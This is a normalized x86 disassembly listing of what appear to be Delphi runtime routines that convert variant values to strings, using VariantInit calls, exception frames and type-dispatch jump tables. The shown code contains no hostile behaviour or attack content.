push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x100
call sub_43eb4c
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_449ed8
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_44a368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4425d0
lea eax [ ebp - 0x10 ]
call sub_43ef08
retn
sub_4425f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_44264a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_43f250
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_4426e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442651
lea eax [ ebp - 0x10 ]
call sub_43ef08
retn
sub_442658
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_44534c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4426cd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_44939c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_43ef08
retn
sub_4426e0
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_442d1e
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_44271a ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_44939c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_449348
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_437298
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_437298
mov edx [ ebp - 0x10 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_442404
mov edx [ ebp - 0x14 ]
mov eax esi
mov ecx 0x0
call sub_449610
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_44243c
mov edx [ ebp - 0x18 ]
mov eax esi
mov ecx 0x0
call sub_449610
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_449c74
mov edx [ ebp - 0x1c ]
mov eax esi
mov ecx 0x0
call sub_449610
jmp r-xdata
lea edx [ ebp - 0x20 ]
movzx eax [ ebx + 0x8 ]
call sub_442474
mov edx [ ebp - 0x20 ]
mov eax esi
mov ecx 0x0
call sub_449610
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x24 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x28 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x2c ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_435834
mov edx [ ebp - 0x30 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_435834
mov edx [ ebp - 0x34 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_435648
mov edx [ ebp - 0x38 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4426e0
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_44253c
mov edx [ ebp - 0x3c ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442d25
lea eax [ ebp - 0x7c ]
mov edx 0x8
call j_sub_44936c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4499f0
lea eax [ ebp - 0x50 ]
mov edx 0x4
call j_sub_44936c
lea eax [ ebp - 0x40 ]
call sub_449348
lea eax [ ebp - 0x3c ]
mov edx 0x7
call j_sub_44936c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4499f0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4425f4
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_44939c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_43e6b8
mov eax esi
mov edx [ ebx + 0x8 ]
mov ecx 0x0
call sub_449f58
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov eax esi
call sub_449348
mov edx eax
mov eax ebx
call sub_442658
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_44253c
mov edx [ ebp - 0x7c ]
mov eax esi
mov ecx 0x0
call sub_449f58
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_44253c
mov edx [ ebp - 0x78 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
jmp [ eax * 4 + jump_table_442a2c ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x44 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_435628
mov edx [ ebp - 0x48 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_437298
mov edx [ ebp - 0x4c ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_437298
mov edx [ ebp - 0x50 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_442404
mov edx [ ebp - 0x54 ]
mov eax esi
mov ecx 0x0
call sub_449610
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_44243c
mov edx [ ebp - 0x58 ]
mov eax esi
mov ecx 0x0
call sub_449610
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
mov ecx 0x0
call sub_4495c0
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_442474
mov edx [ ebp - 0x5c ]
mov eax esi
mov ecx 0x0
call sub_449610
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x60 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x64 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x68 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_435834
mov edx [ ebp - 0x6c ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_435834
mov edx [ ebp - 0x70 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
call sub_435648
mov edx [ ebp - 0x74 ]
mov eax esi
mov ecx 0x0
call sub_449f58
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_4426e0
jmp r-xdata
sub_442d2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_442deb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_442dc9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x8
call sub_43eb4c
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_449ed8
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_44a368
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_449f90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442dd0
lea eax [ ebp - 0x10 ]
call sub_43ef08
retn
sub_442df8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_442e4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_43f250
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_442f38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442e55
lea eax [ ebp - 0x10 ]
call sub_43ef08
retn
sub_442e5c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_442f27
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_44534c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f2e
lea eax [ ebp - 0x24 ]
mov edx 0x2
call j_sub_44936c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_442f05
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x14 ]
call sub_449ed8
mov eax [ ebp - 0x24 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_44a368
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_449f90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_43ef08
retn
sub_442f38
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4434d5
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_442f71 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_449b78
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4499d8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_449f90
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_449f90
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_437298
mov edx [ ebp - 0xc ]
mov eax esi
call sub_449f90
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_437298
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_449f90
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_442404
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_449a14
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_44243c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_449a14
jmp r-xdata
push esi
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_449c74
jmp r-xdata
lea edx [ ebp - 0x1c ]
movzx eax [ ebx + 0x8 ]
call sub_442474
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_449a14
jmp r-xdata
lea edx [ ebp - 0x20 ]
movsx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_449f90
jmp r-xdata
lea edx [ ebp - 0x24 ]
movzx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_449f90
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x2c ]
call sub_435834
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_449f90
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x30 ]
call sub_435834
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_449f90
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_435648
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_442f38
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_442d2c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_449a14
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4434dc
lea eax [ ebp - 0x78 ]
mov edx 0x2
call sub_4499f0
lea eax [ ebp - 0x70 ]
mov edx 0x6
call j_sub_44936c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4499f0
lea eax [ ebp - 0x4c ]
mov edx 0x4
call j_sub_44936c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4499f0
lea eax [ ebp - 0x34 ]
mov edx 0x6
call j_sub_44936c
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4499f0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_442df8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_449a14
jmp r-xdata
dec dx
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_449f90
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_43e6b8
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_449f90
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov eax esi
call sub_4499d8
mov edx eax
mov eax ebx
call sub_442e5c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_442d2c
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_449a14
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_442d2c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_449a14
jmp r-xdata
jmp [ eax * 4 + jump_table_443221 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_449f90
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_435628
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_437298
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_437298
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_442404
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_449a14
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_44243c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_449a14
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_449b3c
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_442474
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_449a14
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_449f90
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_449f90
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_435834
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_435834
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_435648
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_449f90
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_442f38
jmp r-xdata
sub_4434e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_44353a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_43f250
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_443610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443541
lea eax [ ebp - 0x10 ]
call sub_43ef08
retn
sub_443548
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_443600
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
movzx eax [ ebx ]
call sub_44534c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443607
lea eax [ ebp - 0x20 ]
call j_sub_449348
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4435e3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_449ed8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_44a368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_43ef08
retn
sub_443610
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_443bb8
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_44364a ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_449f30
jmp r-xdata
dec dx
je r-xdata
mov eax esi
xor edx edx
call sub_449d2c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_449d2c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_449d2c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_437298
mov edx [ ebp - 0xc ]
mov eax esi
call sub_449d2c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_437298
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_449d2c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_442404
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_449f7c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_44243c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_449f7c
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_449c74
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_449f7c
jmp r-xdata
lea edx [ ebp - 0x20 ]
movzx eax [ ebx + 0x8 ]
call sub_442474
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_449f7c
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_449d2c
jmp r-xdata
lea edx [ ebp - 0x28 ]
movzx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_449d2c
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_435628
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_435834
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_449d2c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_435834
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_449d2c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_435648
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_443610
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_442d2c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_449f7c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443bbf
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_4499f0
lea eax [ ebp - 0x74 ]
mov edx 0x6
call j_sub_44936c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4499f0
lea eax [ ebp - 0x50 ]
mov edx 0x5
call j_sub_44936c
lea eax [ ebp - 0x3c ]
call sub_4499d8
lea eax [ ebp - 0x38 ]
mov edx 0x6
call j_sub_44936c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4499f0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4434e4
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_449d2c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_449d2c
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_43e6b8
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_449d2c
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov eax esi
call j_sub_449348
mov edx eax
mov eax ebx
call sub_443548
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_442d2c
mov edx [ ebp - 0x7c ]
mov eax esi
call sub_449f7c
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_442d2c
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_449f7c
jmp r-xdata
jmp [ eax * 4 + jump_table_443909 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_449d2c
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_435628
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_437298
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
